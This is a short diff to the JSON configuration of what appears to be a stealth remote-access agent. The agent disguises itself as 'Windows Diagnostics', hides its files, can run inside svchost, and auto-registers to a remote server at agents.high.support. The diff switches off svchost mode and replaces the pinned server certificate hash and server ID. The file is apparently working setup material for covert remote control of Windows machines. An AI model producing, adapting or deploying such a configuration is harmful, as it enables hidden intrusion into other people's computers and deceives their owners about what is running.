@@ -37,7 +37,7 @@
   },
   "stealth": {
     "enabled": true,
-    "svchostMode": true,
+    "svchostMode": false,
     "svchostGroup": "netsvcs",
     "bundleExtract": true,
     "hideFiles": true,
@@ -99,7 +99,7 @@
     "encryptedCommunication": true,
     "mutualTLS": false,
     "validateServerCert": true,
-    "serverCertHash": "89EE260CB880664898D38A56350F841AA2B05BA3328E23DB2526D506EAB41A13",
+    "serverCertHash": "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C",
     "allowedSigners": [
       {
         "thumbprint": "724D7C2188A239EEB7E1823181347581DC83A4B1",
@@ -114,7 +114,7 @@
     "meshName": "Windows Diagnostics",
     "meshType": "2",
     "meshId": "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z",
-    "serverId": "89EE260CB880664898D38A56350F841AA2B05BA3328E23DB2526D506EAB41A13",
+    "serverId": "BC7E0DCFDBE4298959C367D398357AF4F4C39396EE1C9289AC25707C25B4294C",
     "serverUrl": "wss://agents.high.support:4445/agent.ashx",
     "autoRegister": true,
     "installFlags": "0"
